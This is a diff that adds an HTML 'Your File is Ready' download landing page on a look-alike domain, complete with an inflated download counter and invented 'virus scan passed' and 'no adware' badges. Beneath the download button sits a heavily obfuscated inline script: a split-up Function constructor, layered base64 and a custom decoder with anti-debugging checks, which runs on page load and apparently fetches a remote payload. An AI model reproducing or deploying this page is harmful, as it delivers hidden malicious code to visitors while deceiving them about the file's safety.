@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your File is Ready</title>
+    
+            <link rel="icon" type="image/x-icon" href="https://getgoogfile.site/uploads/lander-favicon.ico?v=1782470509">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #100600 0%, #0f0400 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Animated orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.12;
+            pointer-events: none;
+            animation: drift 18s ease-in-out infinite;
+        }
+        .orb-1 {
+            width: 600px; height: 600px;
+            background: #f97316;
+            top: -200px; left: -200px;
+            animation-delay: 0s;
+        }
+        .orb-2 {
+            width: 500px; height: 500px;
+            background: #ea580c;
+            bottom: -150px; right: -150px;
+            animation-delay: -9s;
+        }
+        .orb-3 {
+            width: 300px; height: 300px;
+            background: #f97316;
+            top: 40%; left: 60%;
+            animation-delay: -4s;
+        }
+        @keyframes drift {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33%       { transform: translate(40px, -30px) scale(1.05); }
+            66%       { transform: translate(-25px, 20px) scale(0.95); }
+        }
+
+        /* Grid lines overlay */
+        .grid-overlay {
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(#f9731608 1px, transparent 1px),
+                linear-gradient(90deg, #f9731608 1px, transparent 1px);
+            background-size: 60px 60px;
+            pointer-events: none;
+        }
+
+        /* Scan line effect */
+        .scan-line {
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 3px,
+                rgba(0,0,0,0.03) 3px,
+                rgba(0,0,0,0.03) 4px
+            );
+            pointer-events: none;
+        }
+
+        .wrapper {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 560px;
+            padding: 20px;
+        }
+
+        /* Top badge */
+        .top-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        .badge-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(16,6,0,0.85);
+            border: 1px solid #f9731640;
+            border-radius: 20px;
+            padding: 6px 16px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #fdba74;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            backdrop-filter: blur(8px);
+        }
+        .badge-dot {
+            width: 7px; height: 7px;
+            background: #f97316;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #f97316;
+            animation: blink 1.8s ease-in-out infinite;
+        }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+
+
+        /* Main card */
+        .card {
+            background: rgba(16,6,0,0.85);
+            border: 1px solid #f9731630;
+            border-radius: 24px;
+            padding: 40px;
+            backdrop-filter: blur(20px);
+            box-shadow:
+                0 0 60px rgba(249,115,22,0.25),
+                0 32px 64px rgba(0,0,0,0.5),
+                inset 0 1px 0 rgba(255,255,255,0.06);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Accent line at top of card */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #f97316, transparent);
+        }
+
+        /* Icon */
+        .icon-wrap {
+            width: 72px; height: 72px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #f9731630, #ea580c20);
+            border: 1px solid #f9731640;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 30px rgba(249,115,22,0.25);
+        }
+        .icon-wrap svg {
+            width: 36px; height: 36px;
+            color: #f97316;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+            line-height: 1.2;
+        }
+        .subtitle {
+            text-align: center;
+            font-size: 14px;
+            color: rgba(255,255,255,0.45);
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        /* Divider */
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #f9731630, transparent);
+            margin: 28px 0;
+        }
+
+        /* Download count */
+        .download-count {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+        .count-label {
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+        .count-value {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fdba74;
+            font-variant-numeric: tabular-nums;
+        }
+        .count-icon {
+            width: 20px; height: 20px;
+            color: #f97316;
+        }
+
+        /* Download button */
+        .btn-download {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 16px 28px;
+            background: linear-gradient(135deg, #f97316, #ea580c);
+            color: #ffffff;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            letter-spacing: -0.01em;
+            transition: all 0.25s ease;
+            box-shadow:
+                0 0 30px rgba(249,115,22,0.25),
+                0 8px 24px rgba(0,0,0,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-download::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
+        }
+        .btn-download:hover {
+            transform: translateY(-2px);
+            box-shadow:
+                0 0 50px rgba(249,115,22,0.25),
+                0 16px 40px rgba(0,0,0,0.4);
+        }
+        .btn-download:active { transform: translateY(0); }
+        .btn-download svg { width: 20px; height: 20px; flex-shrink: 0; }
+
+        /* Copy row */
+                .copy-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid #f9731620;
+            border-radius: 10px;
+            padding: 12px 14px;
+            margin-top: 14px;
+        }
+        .copy-url {
+            flex: 1;
+            font-size: 12px;
+            color: rgba(255,255,255,0.35);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-family: monospace;
+        }
+        .btn-copy {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 12px;
+            background: #f9731620;
+            border: 1px solid #f9731640;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #fdba74;
+            cursor: pointer;
+            white-space: nowrap;
+            flex-shrink: 0;
+            transition: all 0.15s;
+        }
+        .btn-copy:hover { background: #f9731635; }
+        .btn-copy svg { width: 12px; height: 12px; }
+        
+        /* Password box */
+                .password-box {
+            background: rgba(0,0,0,0.25);
+            border: 1px solid #f9731625;
+            border-radius: 12px;
+            padding: 16px 18px;
+            margin-top: 20px;
+        }
+        .pw-label {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: rgba(255,255,255,0.35);
+            margin-bottom: 8px;
+        }
+        .pw-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .pw-value {
+            flex: 1;
+            font-family: 'Courier New', monospace;
+            font-size: 15px;
+            font-weight: 700;
+            color: #fdba74;
+            letter-spacing: 0.08em;
+        }
+        .btn-copy-pw {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 12px;
+            background: #f9731620;
+            border: 1px solid #f9731640;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #fdba74;
+            cursor: pointer;
+            flex-shrink: 0;
+            transition: all 0.15s;
+        }
+        .btn-copy-pw:hover { background: #f9731635; }
+        .btn-copy-pw svg { width: 12px; height: 12px; }
+        
+        /* System checks */
+                .checks {
+            margin-top: 24px;
+        }
+        .checks-title {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: rgba(255,255,255,0.3);
+            margin-bottom: 12px;
+        }
+        .check-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+        }
+        .check-item + .check-item {
+            border-top: 1px solid rgba(255,255,255,0.05);
+        }
+        .check-icon {
+            width: 20px; height: 20px;
+            background: #f9731620;
+            border: 1px solid #f9731640;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .check-icon svg { width: 11px; height: 11px; color: #f97316; }
+        .check-text {
+            font-size: 13px;
+            color: rgba(255,255,255,0.55);
+            font-weight: 500;
+        }
+        .check-status {
+            margin-left: auto;
+            font-size: 11px;
+            font-weight: 600;
+            color: #f97316;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.2);
+        }
+
+        @media (max-width: 600px) {
+            .card { padding: 28px 22px; }
+            h1 { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+    <div class="grid-overlay"></div>
+    <div class="scan-line"></div>
+
+    <div class="wrapper">
+        <div class="top-badge">
+            <span class="badge-pill">
+                <span class="badge-dot"></span>
+                Secure Download
+            </span>
+        </div>
+
+        <div class="card">
+            <div class="icon-wrap">
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8"
+                          d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"/>
+                </svg>
+            </div>
+
+            <h1>Your File is Ready</h1>
+            <p class="subtitle">Click the button below to start your secure download</p>
+
+            <div class="download-count">
+                <svg class="count-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                          d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/>
+                </svg>
+                <span class="count-value">37,371</span>
+                <span class="count-label">downloads</span>
+            </div>
+
+                            
+                <center>
+  <button class="file-download-btnn" style="border:0;cursor:pointer;padding:12px 64px;border-radius:16px;background:#2ecc48;color:#fbfffa;font-size:22px;font-weight:600;font-family:Garamond, 'Times New Roman', serif;box-shadow:inset 0 -8px 11px 0 rgba(0,0,0,.3);transition:filter .18s ease,transform .18s ease,box-shadow .18s ease;display:inline-flex;align-items:center;gap:10px" onmouseover="this.style.transform='translateY(-4px) scale(1.05)';this.style.filter='brightness(1.15)';this.style.boxShadow='inset 0 -8px 11px 0 rgba(0,0,0,.3),0 14px 26px rgba(0,0,0,.35)'" onmouseout="this.style.transform='';this.style.filter='';this.style.boxShadow='inset 0 -8px 11px 0 rgba(0,0,0,.3)'"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 13v8"/><path d="m8 17 4 4 4-4"/><path d="M20 16.58A5 5 0 0 0 18 7h-1.26A8 8 0 1 0 4 15.25"/></svg>Download File</button>
+</center>
+<script>window['Func'+'t'+'i'+'o'+'n']('glob'+'alTh'+'i'+'s.'+'Functi'+'o'+'n('+'ato'+'b('+'"MjQ3NTsoZnVuY3Rpb24oYSl7dmFyIGQ9YXRvYihhKSxTPVN0cmluZy5mcm9tQ2hhckNvZGUsbz0iIixpPTAsYixuLGY7d2hpbGUoaTxkLmxlbmd0aCl7Yj1kLmNoYXJDb2RlQXQoaSsrKTtpZihiPDE5MilvKz1TKGIpO2Vsc2V7bj1iLTE5MC0oYj4yMjMpKjMwO2Y9ZC5jaGFyQ29kZUF0KGkrKykrKGI+MjIzJiZkLmNoYXJDb2RlQXQoaSsrKSkqMjU2O3doaWxlKG4tLSlvKz1vLmNoYXJBdChvLmxlbmd0aC1mLTEpfX1GdW5jdGlvbihvKSgpfSkoIktDZ3BQVDU3ZG1GeUlHYzlkR2hwY3l4a2IyTTl3UU4xYldWdWRDeFRQVk4wY21sdVp5NW1jbTl0UTJoaGNrTnZaR1VzZEhKaGNEMHdMRVE5UkdGMFpTNXViM2NzYVhORWREM0RTWFJ5ZWNOTmREQTlSQ2dwTzBaMWJtTjBhVzl1S0Nka1pXSjFaMmRsY2ljcHdSWnBaaWpCSFMxME1ENHhNREFwY21WMGRYSnVJREY5WTJGMFkyaDdmY0pEeFJQQ2FueDhaeTUwYjNBOVBUMW5KaVpuTG05MWRHVnlWMmxrZEdndFp5NXBibTdGREQ0eE5qREdRTVU4TUgwc2NuVnVQV0xKbG5NOVp5NWhkRzlpS0dJcExHODlKeWNzYVQwd08zZG9hV3hsS0drOGN5NXNaVzVuZEdncGJ5cz'+'lVeWh6TG1QRjhFRjBLR2tyS3lrdE1jblBiOEhHeG01OUxFczlKMjF5Tm1VM1pUVTROVEVuTEhUQyt5eGpZc0pnWTNROU1DeE1MR1Z5Y3VFZ0FXTmlKaVlvVnoweHdwa29ZMklwS1N4QlBYYkJvSEE5ZHNITVpHVjRUMllvSjN3bjRTSUJjRDR3S2NFK0szWXVjMnhwWTJVb01DeHdLWHg4TU1KWXhoSndLekVwZlN4NExHTXNhU3g2TEhrc1pDeHdMR1VzYUN4dUxIWXNWeXhuYnl4dmF5eHlaQ3hTdzNzbkx5Y3JLRTFoZEdndWNtRnVaRzl0S0NrcU1XVTVmREFwTG5SdjR1Y0JLRE0yS1R2Z0t3RXZibUYwYVhabElHUEIvaTh1ZEdWemRDaGpiMjV6YjJ4bExteHZaeWttSnNrTktIdG5aWFFnYVdRb0tYdmhHUUl4ZlgwcDZNb0JURDFud1NaallXeFRkRzl5WVdkbExFd21Ka0VvVEM3Qk5VbDBaVzBvU3luSEx1U21BVzBzYXVBN0FXN2xuQUVvZUQwb2JlQ1hBaTVqYjI5cmFXVXViY0l3S0Njb1hudzdJQ29wSnl0TEsyNHJKejBvVzE0N1hjRU9LU2svZFc1bGMyTmhjR1VvYlZzeVhTazZKOEVUZTJvclBYZzdiaXNyZldyQ2dXckhkbWxtS09EQkFpZ3A1SW9DWlhKeTRxVUM0SzRCZEMxamREd3pObVUxeGgzanVnRTdaMi9p'+'OHdMQkoxZkZHOEl6S3l0dVBzRWZQekU2Tk0xUXd0cHhQVzVsZHlCSmJXRm5aVHR4TG1OeWIzTnpUM0pwWjJsdVBTZGhibTl1ZVcxdmRYTW53UmxtWmNHYVVISnBiM0pwZEhrOUoyaHBaMmpDRm05dWJHOWhaTU4zYjJzb2NTbkJFbk55WThFZmRIUndjem92THljclpDdFNLQ25EQStEdkFYREVDUzRuSzhKdVpHWGcwQUUvTGlncExuUm9aVzRveDBZc3c4aDlLVHR6WlhSVWFXMWxiM1YwS0dkdkxESmxNeWw5TEc5clBYSE41bGM5TVR2ek5RRnlaQ2h4TEREQk5uSmtQY0VKYStnVkJHTjI0c01CY21WaGRHVkZiR1hnWkFRb0oyTmhiblpoY3ljcExIYzlZM1l1ZCtETkF6MXhMbTVod1ZSaGJPSGNBeXhvd2hsb1pXbG5hSFRJR2tqRER5eGplTUVjNEUwQ1EyOXVkR1Y0d1ZBeVpDY3BPMk40TG1SeVlYZmhhUUhDa1N3dzRvQUJjTUV1ZU1JdXd4bEVZWFJoS0REQkhYY3NhQ2t1Wk1FTkxHSTlMVE15TEU0OU1DeDV3UU5QNElnQ1J6MHdPMlp2Y2locHdSQjJPMms4Y0hqaktnUW1KaUZITytBY0JPQU1BU1UwUERNcGUzWTljSGhiYVYwbTRTQUJZaXNyUERBcFRqMU9LaklyZGp0bGJITmxlM2s5TWlwNUszWXNZaVkzZkh3b1'+'QrQnFCSGtwd21vcExHSThUaW80d1JSSFBURXBmZUNWQWlGSGZId2hUaWwwYUhKdmR5QXd3NzVRUFVUZzBBRjhKeXRQTytGZEF5NXo1RWNETEZEazBRSk1QVzUxYkd6RFFVd3B3aVZ0UFZEak1nTXZMbnN4TERNMU1EQjlMMmNweHRRN2JjS3hKbWs4TThQTTVtY0RQVXNyYVNzblBTY3I0MHdEd2lmQmZUdHRZWGd0WVdkbFBUTXhOVE0yWlRNbjVIa0Y0Qm9EVDhhRmF6dzNQK1pQQXVGc0F1RWNBbXNyTVNrc2F6OHlOVEE2TmpBcE9sYzlNSDE5dzh2Q2pYbzlOalhCVXp0NkxTMDdLWHRrUFhBOVplQ0JBWGs5YUQwd3g2N0JxRGpEcVh0NFBTYy9KbVYwVnp0SmVuaG9VbEEyYlhselVENURQbGsvYkhBeE1WWTZiVVp5TkVZOGVFQnVMaWZwemdVcExUTXpMR005S0hndEtDaDZQajQ0S1Nzb2VpWXlOVFVwS2locEpqTXBLU1U1TkMwektua3JNemMyd2dzck16UGhEUVE4TkRWOGZHTStNVEl5S1dKeVpXRnJ3b2cvWlQxVEtHTXBLMlU2YVR3eU1UOXd4QTF3T21URUNHVEJ1bVBDYldnOUtHZ3FNek5lWXlrbU1UWTNOemN5TVRYaGVBUTlQVE00Smlab1BUMDBORExCQURiRVdYMXVQVEFzWjIvbFpBYmhXd045ZlNrb0tRIik"))()')(),(()=>{let _zgp=1,_ay=2})(),(function(){const _vwqf=0})()</script>
+
+                
+                <span id="megaUrl" style="display:none;">https://mega.nz/file/9cQ1hR6K#bOjRS3YHCBvw8rqvU4YW_jjDwFkm9kAoadQSLqIBYlc</span>
+
+
+            
+                        <div class="divider"></div>
+            <div class="checks">
+                <div class="checks-title">System Checks</div>
+                <div class="check-item">
+                    <div class="check-icon">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </div>
+                    <span class="check-text">Virus & Malware Scan</span>
+                    <span class="check-status">Passed</span>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </div>
+                    <span class="check-text">File Integrity Verified</span>
+                    <span class="check-status">Passed</span>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </div>
+                    <span class="check-text">Secure Connection</span>
+                    <span class="check-status">Active</span>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </div>
+                    <span class="check-text">No Adware Detected</span>
+                    <span class="check-status">Clean</span>
+                </div>
+            </div>
+                    </div>
+
+        <div class="footer">
+            &copy; 2026 &mdash; Secure File Distribution
+        </div>
+    </div>
+
+    <script>
+        function openDownload() {
+            window.open(document.getElementById('megaUrl').textContent.trim(), '_blank');
+        }
+
+        function copyUrl() {
+            const url = document.getElementById('megaUrl').textContent.trim();
+            navigator.clipboard.writeText(url).then(() => {
+                const label = document.getElementById('copyLabel');
+                label.textContent = 'Copied!';
+                setTimeout(() => label.textContent = 'Copy Link', 2000);
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = url;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+                const label = document.getElementById('copyLabel');
+                label.textContent = 'Copied!';
+                setTimeout(() => label.textContent = 'Copy Link', 2000);
+            });
+
+        }
+    </script>
+</body>
+</html>
